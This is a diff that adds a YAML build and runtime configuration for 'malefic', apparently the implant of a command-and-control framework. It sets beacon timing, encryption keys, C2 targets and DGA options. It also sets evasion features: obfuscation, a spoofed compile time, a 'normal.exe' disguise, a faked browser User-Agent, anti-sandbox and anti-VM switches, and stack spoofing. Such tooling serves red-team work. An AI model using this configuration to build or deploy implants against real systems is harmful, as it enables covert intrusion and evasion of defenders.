@@ -1,0 +1,118 @@
+basic:
+  name: "malefic"
+  proxy:
+    use_env_proxy: false
+    url: ""
+  cron: "*/1 * * * * * *"  # every 1 second
+  jitter: 0.2
+  keepalive: false
+  retry: 10
+  max_cycles: -1
+  encryption: aes
+  key: maliceofinternal
+
+  secure:
+    enable: false
+    private_key: ""  # implant private key
+    public_key: ""  # server public key
+
+  # DGA
+  dga:
+    enable: false
+    key: "malefic_dga_2024" # key
+    interval_hours: 8 # generate once every 8 hours
+
+  # Guardrail 
+  guardrail:
+    enable: false
+    require_all: true
+    ip_addresses: []
+    usernames: []
+    server_names: []
+    domains: []
+
+  targets:
+    - address: "127.0.0.1:5001" # tcp pipeline地址
+      rem:
+        link: "tcp://nonenonenonenone:@example.com:12345?wrapper=qu7tnGakBLVUjeS..." # rem链接
+
+build:
+  zigbuild: false
+  obfstr: true
+  toolchain: "nightly-2024-02-03"
+  ollvm:
+    enable: false
+    bcfobf: false # Bogus Control Flow Obfuscation
+    splitobf: false # Split Control Flow Obfuscation
+    subobf: false # Instruction Substitution Obfuscation
+    fco: false # Function CallSite  Obfuscation
+    constenc: false # Constant Encryption Obfuscation
+  metadata:
+    icon: ""
+    compile_time: "24 Jun 2015 18:03:01"
+    file_version: ""
+    product_version: ""
+    company_name: ""
+    product_name: ""
+    original_filename: "normal.exe"
+    file_description: "normal"
+    internal_name: ""
+    require_admin: false  # whether to require admin privilege
+    require_uac: false    # whether to require uac privilege
+
+pulse:
+  flags:
+    start: 0x41
+    end: 0x42
+    magic: "beautiful"
+    artifact_id: 0
+  encryption: xor
+  key: "maliceofinternal"
+  target: 127.0.0.1:80
+  protocol: "http"
+  http:
+    method: "POST"
+    path: "/pulse"
+    version: "1.1"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
+
+
+implants:
+  runtime: tokio          # async runtime: smol/tokio/async-std
+  mod: beacon             # malefic mod: beacon/bind
+  register_info: true     # whether collect sysinfo when register
+  hot_load: true          # enable hot load module
+  modules: []                # module when malefic compile
+  enable_3rd: false       # enable 3rd module
+  3rd_modules: []           # 3rd module when malefic compile
+
+  prelude: ""             # autorun config filename
+  pack: []  
+  flags:
+    start: 0x41
+    end: 0x42
+    magic: "beautiful"
+    artifact_id: 0x1
+
+  # for professional
+  anti: # 
+    sandbox: false
+    vm: false            # enable anti vm
+
+  apis:
+    level: "nt_apis"
+    priority:
+      normal:
+        enable: false
+        type: "normal"
+      dynamic:
+        enable: true
+        type: "user_defined_dynamic"
+      syscalls:
+        enable: false
+        type: "inline_syscall"
+  alloctor:
+    inprocess: "NtAllocateVirtualMemory"
+    crossprocess: "NtAllocateVirtualMemory"
+  thread_stack_spoofer: true
